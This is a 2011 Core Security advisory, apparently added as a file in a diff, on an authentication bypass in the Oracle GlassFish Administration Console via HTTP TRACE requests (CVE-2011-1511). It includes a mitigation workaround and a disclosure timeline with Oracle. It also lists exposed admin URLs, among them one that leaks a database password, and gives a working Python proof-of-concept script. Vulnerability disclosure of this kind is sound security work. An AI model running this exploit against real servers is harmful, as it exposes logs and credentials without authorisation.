@@ -1,0 +1,169 @@
+Oracle GlassFish Server Administration Console Authentication Bypass
+
+1. Advisory Information
+
+Title: Oracle GlassFish Server Administration Console Authentication Bypass
+Advisory ID: CORE-2010-1118
+Advisory URL: http://www.coresecurity.com/content/glassfish_admin_authentication_bypass
+Date published: 2011-05-11
+Date of last update: 2011-05-11
+Vendors contacted: Oracle
+Release mode: User release
+
+2. Vulnerability Information
+
+Class: Authentication Bypass Issues [CWE-592]
+Impact: Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2011-1511
+
+3. Vulnerability Description
+
+Built using the GlassFish Server Open Source Edition, Oracle GlassFish Server delivers a flexible, lightweight and extensible Java EE 6 platform. It provides a small footprint, fully featured Java EE application server that is completely supported for commercial deployment and is available as a standalone offering.
+
+The Administration Console of Oracle GlassFish Server, which is listening by default on port 4848/TCP, is prone to an authentication bypass vulnerability. This vulnerability can be exploited by remote attackers to access sensitive data on the server without being authenticated, by making TRACE requests against the Administration Console.
+
+4. Vulnerable packages
+
+    Oracle GlassFish Server 3.0.1
+    Sun GlassFish Enterprise Server 2.1.1
+
+5. Non-vulnerable packages
+
+    Oracle GlassFish Server 3.1
+    Contact Oracle for patches for other GlassFish versions
+
+6. Vendor Information, Solutions and Workarounds
+
+Oracle notifies that GlassFish Server 3.1 was released in March 2011 and was fixed before release, so it is not affected. Oracle also notifies that patches for previous versions will be available in July, 2011. As a policy, Oracle does not provide workarounds unless they can be easily applied by every customer.
+
+6.1. Workaround by Core Security
+
+For users who cannot upgrade to the latest patched version, the following workaround can be applied in order to avoid this flaw:
+
+    In the GlassFish Admin Console, go to the Tasks tree.
+    Navigate through: Network Config > Protocols > admin-listener > HTTP.
+    There is a checkbox "Trace: Enable TRACE operation" (checked by default); uncheck it and then save changes.
+    Finally, restart GlassFish by doing C:\glassfishv3\bin>asadmin restart-domain
+
+After following these steps, when executing the PoC included in this advisory, the webserver should respond:
+
+405 TRACE method is not allowed headers = [('date', 'Thu, 28 Apr 2011 20:39:43 GMT'), ('content-length', '0'), ('connection', 'close'), ('allow', 'GET, HEAD, POST'), ('x-powered-by', 'Servlet/3.0')] [+ full code]
+
+7. Credits
+
+This vulnerability was discovered and researched by Francisco Falcon from Core Security Technologies.
+
+8. Technical Description / Proof of Concept Code
+
+8.1. Introduction
+
+Built using the GlassFish Server Open Source Edition, Oracle GlassFish Server [1] delivers a flexible, lightweight and extensible Java EE 6 platform. It provides a small footprint, fully featured Java EE application server that is completely supported for commercial deployment and is available as a standalone offering.
+
+The Administration Console of Oracle GlassFish Server, which is listening by default on port 4848/TCP, is prone to an authentication bypass vulnerability. This vulnerability can be exploited by remote attackers to access sensitive data on the server without being authenticated, by making TRACE requests against the Administration Console.
+
+8.2. Authentication Bypass
+
+[CVE-2011-1511] By default, when GlassFish Server starts, it runs an HTTP listener named admin-listener, associated with the __asadmin virtual server. This administrative server, which is accessed by the Administration Console, has the HTTP TRACE verb enabled by default. This can be configured from the Network Config > Protocols > admin-listener > HTTP tab.
+
+By performing HTTP requests against the GlassFish Administration Console using the TRACE method, a remote, unauthenticated attacker can get access to the content of restricted pages in the Administration Console, because GlassFish Server will behave as if it were handling GET requests from authenticated users.
+
+It is important to note that the response of GlassFish Server to a TRACE request includes the full content of the requested resource in the response body, as in a GET request; according to RFC 2616 (Hypertext Transfer Protocol -- HTTP/1.1), section 9.8 [2], the response SHOULD reflect the original request to the client in the response body.
+
+The vulnerability described above allows attackers to access the content of the following pages without being authenticated:
+
+    Log Viewer: http://<GlassFish_IP>:4848/common/logViewer/logViewer.jsf
+    Information about the Java Virtual Machine installed on the server: http://<GlassFish_IP>:4848/common/appServer/jvmReport.jsf
+    Installed components: http://<GlassFish_IP>:4848/updateCenter/installed.jsf
+    Properties of an existing JDBC connection pool, including DB password: http://<GlassFish_IP>:4848/jdbc/jdbcConnectionPoolProperty.jsf?name=DerbyPool
+
+The following Python code is a Proof-of-Concept of the vulnerability; it will retrieve the content of the Log Viewer effectively bypassing the authentication:
+#Usage: $ python poc.py <GlassFish_IP> <Administration_Port> #E.g: $ python poc.py 192.168.0.1 4848
+
+import sys
+import httplib
+
+def make_trace_request(host, port, selector):
+
+    print '[*] TRACE request: %s' % selector
+    headers = { 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0;
+Windows NT 5.1; Trident/4.0)',
+                'Host': '%s:%s' % (host, port),
+                'Accept':
+'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-us,en;q=0.5',
+                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                'Accept-Encoding': 'gzip,deflate',
+                'Connection': 'close',
+                'Referer': 'http://%s:%s%s' % (host, port, selector)}
+
+    conn = httplib.HTTPConnection(host, port)
+    conn.request('TRACE', selector, headers=headers)
+    response = conn.getresponse()
+    conn.close()
+
+    print response.status, response.reason
+    print response.getheaders()
+    print response.read()
+
+
+
+if len(sys.argv) != 3:
+    print "Usage: $ python poc.py <GlassFish_IP>
+<GlassFish_Administration_Port>\nE.g:   $ python poc.py 192.168.0.1 4848"
+    sys.exit(0)
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+make_trace_request(host, port, '/common/logViewer/logViewer.jsf')
+
+9. Report Timeline
+
+    2010-12-06: Initial notification sent to Oracle.
+    2010-12-07: Oracle replies that the bug has been forwarded to the product engineers, and requests Core to postpone the publication of the advisory.
+    2010-12-09: Core replies that the publication of the advisory can be postponed as long as Oracle provides a timeline for the release of fixes.
+    2010-12-20: Oracle confirms that it is a defect and it will be fixed in the development release. Oracle also replies that the fixes are planned to be released in April 2011.
+    2011-02-04: Core requests a status update on the fixes, and asks if Oracle can meet the April 2011 deadline.
+    2011-02-04: Oracle replies that the development version of GlassFish has already been fixed, and that the patches are being tested. They will update when all patches are tested and ready, still tracking an April 2011 release.
+    2011-02-17: Core informs that in that case the publication date will remain April 3rd.
+    2011-02-22: Oracle requests that the publication date is moved to April 19th, and informs that the patches are in progress and planned to be included in the upcoming Oracle's Critical Patch Update Security Advisory.
+    2011-02-24: Core replies acknowledging April 19th as the publication date.
+    2011-03-30: Core asks whether the GlassFish team is on track for an April 19th publication date.
+    2011-03-31: Oracle notifies that "patches would probably be ready to be released by April 19th. The bug affects multiple supported releases of the product with different fix schedules, and the GlassFish team is in various stages of the process."
+    2011-04-18: Core asks whether the GlassFish team is on track for an April 19th publication date.
+    2011-04-20: Oracle team notifies that in the previous email there was an unfortunate typo: when they wrote "It looks like patches would be ready to be released by April 19th", they meant "patches would not be ready... ". Oracle also requests to move the publication date to July 19th.
+    2011-04-25: Core notifies that this issue was reported on [2010-12-06] and (3 weeks ago [2011-03-31]) was confirmed to be released on Apr 19th. The typo Oracle mentioned changes the meaning of the last email altogether, while moving the release ahead for the end of July. Core communicates that no information was received about which specific versions of the software are vulnerable, and what are the specific workarounds or countermeasures that could be deployed in order to mitigate this vulnerability. Also, Core asks more details about Oracle's decision to postpone the release of fixes for 3 months. Specifically, Core wants to know if Oracle is intentionally delaying the release of patches to include them in the release of a new version of their product.
+    2011-04-25: Oracle notifies that:
+        This issue affects Sun GlassFish Enterprise Server 2.1.1 and Oracle GlassFish Server 3.0.1.
+        Oracle GlassFish Server 3.1 was released in March 2011 and was fixed before the release, so it is not affected.
+        The fix review, integration, test and release cycles run on predetermined schedules. Oracle is not delaying any fixes.
+        As a policy, Oracle does not provide workarounds unless they can be easily applied by every customer.
+        Fixes have been integrated; all the final patches should be available in July. 
+    2011-05-05: Core decides to release the advisory next Wednesday, May 11th; and notifies the sequence of events that has motivated that decision:
+        Oracle was notified of the vulnerability 5 month ago.
+        Oracle released a fixed version of GlassFish (March 2011) without notifying Core, without patching previous versions and without publishing any workaround for affected users.
+        Core has a workaround that mitigates the vulnerability. 
+    Core sends the proposed workaround [Sec. 6.1] to the Oracle Team and asks if they want to add further information in the advisory.
+    2011-05-06: Oracle requests Core to hold the advisory publication until they have patches available for all customers. Oracle states that they announce security fixes on a pre-determined schedule, so users are prepared to apply them. Adhoc publication of issues may not allow every customer to monitor and apply patches in time, which increases their exposure.
+    2011-05-09: Core notifies that the publication of security advisories is aimed at explaining the problem to the vulnerable user community and providing the technical details and guidance so they can devise protection countermeasures. Core usually releases this information in coordination with the vendor, but in this case this is not possible because Oracle has already released patches for some versions (without notifying Core). Currently, there is a patched version of GlassFish and there are vulnerable versions with exposed users. In this scenario, Core has decided to release the advisory as 'user 'release' next Wednesday, providing a way to mitigate the problem until patches are available. The vendor (Oracle in this case) may or may not agree with Core assessment on how to help users to reduce risk, but the vendor is certainly not the only party entitled to provide plausible solutions to the problem.
+    2011-05-11: Advisory CORE-2010-1118 is published. 
+
+10. References
+
+[1] http://www.oracle.com/us/products/middleware/application-server/oracle-glassfish-server/index.html
+[2] http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html
+11. About CoreLabs
+
+CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+12. About Core Security Technologies
+
+Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and prove real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.
+13. Disclaimer
+
+The contents of this advisory are copyright (c) 2011 Core Security Technologies and (c) 2011 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+14. PGP/GPG Keys
+
+This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc. 
